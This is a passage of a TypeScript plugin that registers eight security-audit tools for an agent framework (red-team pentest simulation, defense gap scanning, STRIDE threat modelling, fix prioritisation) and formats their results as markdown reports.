  lines.push('')
  lines.push(`**Chains Found:** ${result.chains.length}`)
  lines.push(`**Highest Risk:** ${result.highestRiskChain}`)
  lines.push('')

  if (result.chains.length > 0) {
    lines.push('## Chains')
    lines.push('')
    for (const chain of result.chains) {
      lines.push(`### ${chain.id} [${chain.combinedSeverity.toUpperCase()}]`)
      lines.push('')
      lines.push(`- **Success Probability:** ${Math.round(chain.successProbability * 100)}%`)
      lines.push(`- **Entry:** ${chain.entryPoint}`)
      lines.push('')
      lines.push('**Steps:**')
      for (let i = 0; i < chain.steps.length; i++) {
        lines.push(`${i + 1}. ${chain.steps[i]}`)
      }
      lines.push('')
    }
  }

  if (result.recommendations.length > 0) {
    lines.push('## Recommendations')
    lines.push('')
    for (const rec of result.recommendations) {
      lines.push(`- [>] ${rec}`)
    }
    lines.push('')
  }

  lines.push('---')
  lines.push(`*Generated by RedBlue Audit at ${now()}*`)
  return lines.join('\n')
}

function formatGapResult(result: GapResult): string {
  const lines: string[] = []
  lines.push('# Defense Gap Scan Report')
  lines.push('')
  lines.push(`**Total Gaps:** ${result.totalGaps}`)
  lines.push(`**Risk Exposure:** ${result.riskExposure}/100`)
  lines.push('')

  if (result.quickWins.length > 0) {
    lines.push('## Quick Wins')
    lines.push('')
    for (const qw of result.quickWins) {
      lines.push(`- [QUICK] ${qw}`)
    }
    lines.push('')
  }

  if (result.gaps.length > 0) {
    lines.push('## Gaps Detail')
    lines.push('')
    for (const gap of result.gaps) {
      lines.push(`### ${severityEmoji(gap.severity)} ${gap.control}`)
      lines.push('')
      lines.push(`- **Effort:** ${gap.effort}`)
      lines.push(`- **Description:** ${gap.description}`)
      lines.push('')
    }
  }

  lines.push('---')
  lines.push(`*Generated by RedBlue Audit at ${now()}*`)
  return lines.join('\n')
}

function formatSurfaceResult(result: SurfaceResult): string {
  const lines: string[] = []
  lines.push('# Attack Surface Map')
  lines.push('')
  lines.push(`**Total Entry Points:** ${result.totalEntryPoints}`)
  lines.push(`**Internet-Facing:** ${result.internetFacing}`)
  lines.push('')

  if (result.heatZones.length > 0) {
    lines.push('## Heat Zones (High Risk)')
    lines.push('')
    for (const zone of result.heatZones) {
      lines.push(`- [HOT] ${zone}`)
    }
    lines.push('')
  }

  if (result.surfaces.length > 0) {
    lines.push('## Surface Detail')
    lines.push('')
    for (const s of result.surfaces) {
      const expMark = s.exposure === 'internet' ? '[PUBLIC]' : s.exposure === 'internal' ? '[INTERNAL]' : '[LOCAL]'
      lines.push(`### ${expMark} ${s.component}`)
      lines.push('')
      lines.push(`- **Risk:** ${severityEmoji(s.riskLevel)} ${s.riskLevel}`)
      lines.push(`- **Entry Points:** ${s.entryPoints}`)
      lines.push(`- **Description:** ${s.description}`)
      lines.push('')
    }
  }

  lines.push('---')
  lines.push(`*Generated by RedBlue Audit at ${now()}*`)
  return lines.join('\n')
}

function formatPriorityResult(result: PriorityResult): string {
  const lines: string[] = []
  lines.push('# Fix Priority Matrix')
  lines.push('')
  lines.push(`**Total Items:** ${result.items.length}`)
  lines.push(`**Total Effort:** ${result.totalEffort} person-days`)
  lines.push('')

  if (result.quickWins.length > 0) {
    lines.push('## Quick Wins')
    lines.push('')
    for (const qw of result.quickWins) {
      lines.push(`- [QUICK] ${qw.vulnerabilityId} (score: ${qw.priorityScore}, effort: ${qw.fixEffort}d)`)
    }
    lines.push('')
  }

  if (result.majorProjects.length > 0) {
    lines.push('## Major Projects')
    lines.push('')
    for (const mp of result.majorProjects) {
      lines.push(`- [PROJECT] ${mp.vulnerabilityId} (score: ${mp.priorityScore}, effort: ${mp.fixEffort}d)`)
    }
    lines.push('')
  }

  lines.push('## All Items (by priority)')
  lines.push('')
  for (const item of result.items) {
    const catMark = item.category === 'quick_win' ? '[QUICK]' : item.category === 'major_project' ? '[PROJECT]' : item.category === 'reconsider' ? '[SKIP]' : '[FILL]'
    lines.push(`- ${catMark} ${item.vulnerabilityId} | CVSS: ${item.cvssScore} | Priority: ${item.priorityScore} | Effort: ${item.fixEffort}d`)
  }
  lines.push('')

  lines.push('---')
  lines.push(`*Generated by RedBlue Audit at ${now()}*`)
  return lines.join('\n')
}

function formatThreatModel(result: ThreatModelResult): string {
  const lines: string[] = []
  lines.push('# STRIDE Threat Model')
  lines.push('')
  lines.push(`**System:** ${result.systemName}`)
  lines.push(`**Total Threats:** ${result.threats.length}`)
  lines.push('')

  lines.push('## STRIDE Breakdown')
  lines.push('')
  for (const [stride, count] of Object.entries(result.strideBreakdown)) {
    if (count > 0) {
      lines.push(`- ${strideName(stride as StrideCategory)}: ${count}`)
    }
  }
  lines.push('')

  if (result.topRisks.length > 0) {
    lines.push('## Top Risks')
    lines.push('')
    for (const risk of result.topRisks) {
      lines.push(`- [RISK] ${risk}`)
    }
    lines.push('')
  }

  if (result.threats.length > 0) {
    lines.push('## Threat Detail')
    lines.push('')
    for (const t of result.threats) {
      lines.push(`### ${severityEmoji(t.severity)} ${t.id}: ${t.description}`)
      lines.push('')
      lines.push(`- **STRIDE:** ${strideName(t.stride)}`)
      lines.push(`- **Component:** ${t.component}`)
      lines.push(`- **Attack Vector:** ${t.attackVector}`)
      lines.push('- **Mitigations:**')
      for (const m of t.mitigations) {
        lines.push(`  - [DEFEND] ${m}`)
      }
      lines.push('')
    }
  }

  lines.push('---')
  lines.push(`*Generated by RedBlue Audit at ${now()}*`)
  return lines.join('\n')
}

// ============================================================================
// PLUGIN DEFINITION
// ============================================================================

export const name = 'dsh-tool-redblue'
export const inject = ['tools']

export function apply(ctx: Context) {
  const tools = ctx.tools

  // Tool 1: red_team_pentest
  tools.register(defineTool({
    name: 'red_team_pentest',
    description: 'Simulate red team attack on code/config. Tests for injection flaws, auth bypass, data exposure, crypto weaknesses using OWASP Top 10 attack patterns.',
    parameters: {
      target_code: {
        type: 'string',
        required: true,
        description: 'JSON object with fields: code (string), language (string), context ("api"|"web"|"cli"|"library"), entry_points (string[])'
      }
    },
    output: { schema: { type: 'string' }, render: (_args, value) => [{ type: 'text', text: value as string }] },
    async execute(args: { target_code: string }) {
      const data: PentestInput = JSON.parse(args.target_code)
      const result = runRedTeamPentest(data)
      return formatPentestResult(result)
    }
  }))

  // Tool 2: blue_team_defense
  tools.register(defineTool({
    name: 'blue_team_defense',
    description: 'Assess existing security controls. Checks input validation, output encoding, auth mechanisms, encryption, CORS, CSP, rate limiting effectiveness.',
    parameters: {
      defense_input: {
        type: 'string',
        required: true,
        description: 'JSON object with fields: code (string), language (string), controls (string[] - specific controls to check)'
      }
    },
    output: { schema: { type: 'string' }, render: (_args, value) => [{ type: 'text', text: value as string }] },
    async execute(args: { defense_input: string }) {
      const data: DefenseInput = JSON.parse(args.defense_input)
      const result = analyzeDefenseControls(data)
      return formatDefenseResult(result)
    }
  }))

  // Tool 3: audit_compliance_map
  tools.register(defineTool({
    name: 'audit_compliance_map',
    description: 'Map vulnerabilities to compliance frameworks (OWASP Top 10, CWE, NIST, ISO 27001, SOC2, GDPR). Returns compliance gaps and priority areas.',
    parameters: {
      compliance_input: {
        type: 'string',
        required: true,
        description: 'JSON object with vulnerabilities (JSON string of Vulnerability array) and targetFrameworks (string[] - frameworks to map to)'
      }
    },
    output: { schema: { type: 'string' }, render: (_args, value) => [{ type: 'text', text: value as string }] },
    async execute(args: { compliance_input: string }) {
      const data: ComplianceInput = JSON.parse(args.compliance_input)
      const result = mapCompliance(data)
      return formatComplianceResult(result)
    }
  }))

  // Tool 4: exploit_chain_analysis
  tools.register(defineTool({
    name: 'exploit_chain_analysis',
    description: 'Analyze whether multiple low-severity vulnerabilities can form high-severity exploit chains. Identifies attack paths and combined severity.',
    parameters: {
      chain_input: {
        type: 'string',
        required: true,
        description: 'JSON object with vulnerabilities (JSON string of Vulnerability array) and maxChainLength (number, optional)'
      }
    },
    output: { schema: { type: 'string' }, render: (_args, value) => [{ type: 'text', text: value as string }] },
    async execute(args: { chain_input: string }) {
      const data: ChainInput = JSON.parse(args.chain_input)
      const result = analyzeExploitChains(data)
      return formatChainResult(result)
    }
  }))

  // Tool 5: defense_gap_scan
  tools.register(defineTool({
    name: 'defense_gap_scan',
    description: 'Identify missing security controls in the codebase. Checks for required security measures and returns prioritized gap list with effort estimates.',
    parameters: {
      gap_input: {
        type: 'string',
        required: true,
        description: 'JSON object with fields: code (string), architecture (string), requiredControls (string[])'
      }
    },
    output: { schema: { type: 'string' }, render: (_args, value) => [{ type: 'text', text: value as string }] },
    async execute(args: { gap_input: string }) {
      const data: GapScanInput = JSON.parse(args.gap_input)
      const result = scanDefenseGaps(data)
      return formatGapResult(result)
    }
  }))

  // Tool 6: attack_surface_map
  tools.register(defineTool({
    name: 'attack_surface_map',
    description: 'Map the application attack surface including endpoints, dependencies, and configurations. Identifies internet-facing components and heat zones.',
    parameters: {
      surface_input: {
        type: 'string',
        required: true,
        description: 'JSON object with fields: endpoints (string[]), dependencies (string[]), configs (string[])'
      }
    },
    output: { schema: { type: 'string' }, render: (_args, value) => [{ type: 'text', text: value as string }] },
    async execute(args: { surface_input: string }) {
      const data: SurfaceInput = JSON.parse(args.surface_input)
      const result = mapAttackSurface(data)
      return formatSurfaceResult(result)
    }
  }))

  // Tool 7: fix_priority_matrix
  tools.register(defineTool({
    name: 'fix_priority_matrix',
    description: 'Generate fix priority matrix based on CVSS, exploit difficulty, business impact, and fix effort. Categorizes items as quick wins, major projects, fill-in, or reconsider.',
    parameters: {
      priority_input: {
        type: 'string',
        required: true,
        description: 'JSON object with vulnerabilities (JSON string of Vulnerability array) and constraints (optional {maxEffort, deadlineDays})'
      }
    },
    output: { schema: { type: 'string' }, render: (_args, value) => [{ type: 'text', text: value as string }] },
    async execute(args: { priority_input: string }) {
      const data: PriorityInput = JSON.parse(args.priority_input)
      const result = analyzeFixPriority(data)
      return formatPriorityResult(result)
    }
  }))

  // Tool 8: threat_model_gen
  tools.register(defineTool({
    name: 'threat_model_gen',
    description: 'Generate STRIDE threat model for a system. Identifies Spoofing, Tampering, Repudiation, Info Disclosure, DoS, and Elevation of Privilege threats.',
    parameters: {
      threat_input: {
        type: 'string',
        required: true,
        description: 'JSON object with fields: systemName (string), components (string[]), dataFlows (string[]), trustBoundaries (string[])'
      }
    },
    output: { schema: { type: 'string' }, render: (_args, value) => [{ type: 'text', text: value as string }] },
    async execute(args: { threat_input: string }) {
      const data: ThreatModelInput = JSON.parse(args.threat_input)
      const result = generateThreatModel(data)
      return formatThreatModel(result)
    }
  }))

  console.log(`[dsh-tool-redblue] Loaded - Red-Blue Security Audit with 8 tools`)
}

